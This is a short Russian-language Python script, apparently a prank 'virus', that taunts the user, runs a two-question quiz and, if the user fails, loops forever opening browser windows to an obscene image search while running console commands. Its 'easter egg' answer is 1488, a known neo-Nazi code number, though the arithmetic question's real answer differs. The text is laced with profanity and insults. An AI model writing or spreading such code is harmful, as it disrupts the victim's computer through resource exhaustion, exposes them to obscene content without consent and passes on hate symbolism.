import libira

print("ХАХАХАХАХАХАХАХАХАХАХАХХАХАХАХАХА ЛОХ ПОПАЛСЯ НА ВИРУС СОЗДАНЫЙ С БИБЛИОТЕКОЙ LIBIRA.PY")
print("уже поздно я уже на твоем пк")
print(" ")
print("ладно дам тебе еще один шанс")
print(" ")

life = 2

qu1 = input("Ты знаешь Python? ")
if qu1.lower() == "да":
    print("молодец, прошел первый уровень")
else:
    life -= 1
    print("АППАПАХАХПХАХАПХАХ У ТЕБЯ ОСТАЛОСЬ 1 ЖИЗНЬ ЛОХ")

print(" ")

print("Вопрос второй, сколько будет (500+100)×(10−2)+288?")

pashalko = int(input("Пиши блядский ответ сюда: "))

if pashalko == 1488:
    print("ААА ПОСХАЛКО ПОСХАЛКО ВКЛЮЧАЕМ ВЕНТИЛЯТОРЫ!!!")
    print("Ладно, все, вирус отключен, пупс, а теперь иди смотри ютуб")
    libira.open_url("https://www.youtube.com/watch?v=lSppTdATOOc")
else:
    life -= 1
    print(" ")
    print("твоему компу пизда у тебя осталось", life, "жизней")

if life == 0:
    while True:
        libira.cmd("start https://www.google.com/imgres?q=%D1%87%D0%BB%D0%B5%D0%BD%20%D0%BE%D0%B1%D0%B5%D0%B7%D1%8C%D1%8F%D0%BD%D1%8B&imgurl=https%3A%2F%2Fs00.yaplakal.com%2Fpics%2Fpics_original%2F7%2F0%2F5%2F18540507.jpg&imgrefurl=https%3A%2F%2Fwww.yaplakal.com%2Fforum1%2Ftopic2691527.html&docid=2uRdciNcxvBjOM&tbnid=YrsTRNBh8yxTsM&vet=12ahUKEwjSgvi15OSFAxW2SPEDHaJ7DfYQM3oECG4QAA..i&w=479&h=320&hcb=2&ved=2ahUKEwjSgvi15OSFAxW2SPEDHaJ7DfYQM3oECG4QAA")
        libira.cmd("color 2")
        libira.cmd("dir/s")
